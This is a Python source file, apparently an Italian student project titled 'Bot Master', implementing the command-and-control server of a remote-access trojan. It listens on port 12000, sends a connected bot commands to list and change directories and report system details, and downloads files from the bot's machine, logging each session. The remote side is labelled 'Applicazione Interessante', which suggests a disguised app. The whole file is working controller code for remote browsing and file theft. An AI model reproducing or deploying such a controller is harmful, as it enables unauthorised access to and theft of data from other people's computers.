"""
Bot Master

AUTORI: Matteo Marino, Alessandro Trincone, Vincenzo Papale
"""
from socket import *
from functions import *

serverPort = 12000
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind( ('',serverPort) )
serverSocket.listen(10)
report = open("./Log.txt","a")          #Genera un report della sessione
ct = datetime.now().strftime("%d-%m-%Y")
report.write(ct + "\n")
while True:
    try:
        client, addr = serverSocket.accept()
        report.write("[" + datetime.now().strftime("%H:%M:%S") + "] Connesso\n")
        print("Connesso\n")
        while True:
            com = input ("\nInserire un comando (\"help\" per la lista dei comandi): ")
            comando = "x"
            if com == "system":
                comando = "1"
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
            elif com == "ls":
                comando = "2"
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Bot Master\" ls\n")
            #Cambia directory inserendo la directory destinazione dopo cd (cd directory)
            elif com[0:3] == "cd ":
                comando = "3" + com[2:]
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
            #Visualizza la current working directory
            elif com == "pwd":
                comando = "4"
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Bot Master\" pwd\n")
            #Legge un file presente nella working directory
            elif com[0:9] == "download ":
                file = com[9:]
                comando = "5" + file
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
            #Visualizza la lista dei comandi
            elif com == "help":
                cmd_list()
                continue
            #Chiude la connessione
            elif com == "exit":
                comando = "exit"
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Bot Master\" exit\n")
            else:
                print("Comando non riconosciuto\n")
                continue
            client.send(comando.encode())
            if comando == "exit":
                print ("Connessione terminata")
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] Disconnesso\n\n")
                report.close()
                break
            if com[0:9] == "download ":
                packs = []
                byteLetti = 0
                msglen = int(client.recv(1024).decode())
                while byteLetti < msglen:
                    try:
                        pack = client.recv(min(msglen - byteLetti,4096))
                        if pack == "":
                            raise RuntimeError
                        packs.append(pack)
                        byteLetti += len(pack)
                    except RuntimeError:
                        print("Errore di ricezione")
                download_file(packs,com[9:])        
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] downloaded " + com[9:] + "\n")
            else:
                messaggio = client.recv(4096).decode()
                print ("\n" + messaggio + "\n")
                ct = datetime.now().strftime("%H:%M:%S")
                report.write("[" + ct + "] \"Applicazione Interessante\"\n" + messaggio + "\n")
        client.close()
    except BaseException:
        print("Errore\n")
        break